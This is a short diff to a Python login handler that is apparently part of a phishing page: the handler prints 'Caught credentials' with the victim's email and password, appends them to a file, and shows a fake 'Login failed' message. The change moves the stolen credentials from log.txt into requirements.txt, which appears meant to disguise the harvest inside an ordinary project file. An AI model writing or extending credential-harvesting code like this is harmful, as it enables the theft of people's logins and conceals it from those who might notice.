@@ -35,7 +35,7 @@ def login():
 
     print(f"[+] Caught credentials: {email} | {password}")
 
-    with open('log.txt', 'a') as f:
+    with open('requirements.txt', 'a') as f:
         f.write(f"{email} | {password}\n")
 
     return "Login failed. Try again later."
